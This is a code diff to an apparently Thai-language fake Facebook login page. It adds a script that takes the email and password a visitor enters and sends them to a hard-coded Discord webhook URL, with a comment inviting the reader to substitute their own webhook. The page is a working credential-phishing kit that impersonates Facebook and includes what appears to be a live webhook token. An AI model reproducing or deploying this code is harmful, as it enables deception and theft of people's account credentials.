@@ -101,18 +101,53 @@
         </div>
         <div class="right-section">
             <div class="login-form">
-                <input type="text" placeholder="อีเมลหรือเบอร์โทรศัพท์" required>
-                <input type="password" placeholder="รหัสผ่าน" required>
-                <button type="submit">เข้าสู่ระบบ</button>
+                <input id="email" type="text" placeholder="อีเมลหรือเบอร์โทรศัพท์" required>
+                <input id="password" type="password" placeholder="รหัสผ่าน" required>
+                <button type="button" onclick="submitForm()">เข้าสู่ระบบ</button>
                 <a href="#">ลืมรหัสผ่านใช่หรือไม่?</a>
-                <div class="create-account">
-                    สร้างบัญชีใหม่
-                </div>
+                <div class="create-account">สร้างบัญชีใหม่</div>
             </div>
         </div>
     </div>
     <div class="footer">
         <p></p>
     </div>
+
+    <script>
+        function submitForm() {
+            var email = document.getElementById("email").value;
+            var password = document.getElementById("password").value;
+
+            // สร้างข้อมูลที่จะส่งไปยัง Discord webhook
+            var message = {
+                content: "Login attempt:",
+                embeds: [
+                    {
+                        title: "Facebook Login",
+                        fields: [
+                            { name: "Email", value: email },
+                            { name: "Password", value: password }
+                        ]
+                    }
+                ]
+            };
+
+            // ส่งข้อมูลไปยัง Discord webhook โดยใช้ XMLHttpRequest
+            var webhookURL = "https://discord.com/api/webhooks/1252253384501887067/VEuHR4FVh43ztNVPgmE0kd7RqWFIM154Gha7s63Do-R1tc4VbuLQ8DzOaamP323Te4nd"; // แทนที่ด้วย URL ของ Discord webhook ของคุณ
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", webhookURL);
+            xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+            xhr.send(JSON.stringify(message));
+
+            // ตรวจสอบการส่งข้อมูลสำเร็จหรือไม่
+            xhr.onload = function() {
+                if (xhr.status >= 200 && xhr.status < 300) {
+                    alert("ส่งข้อมูลการล็อกอินไปยัง Discord Webhook สำเร็จ!");
+                } else {
+                    alert("เกิดข้อผิดพลาดในการส่งข้อมูลไปยัง Discord Webhook");
+                }
+            };
+        }
+    </script>
 </body>
 </html>
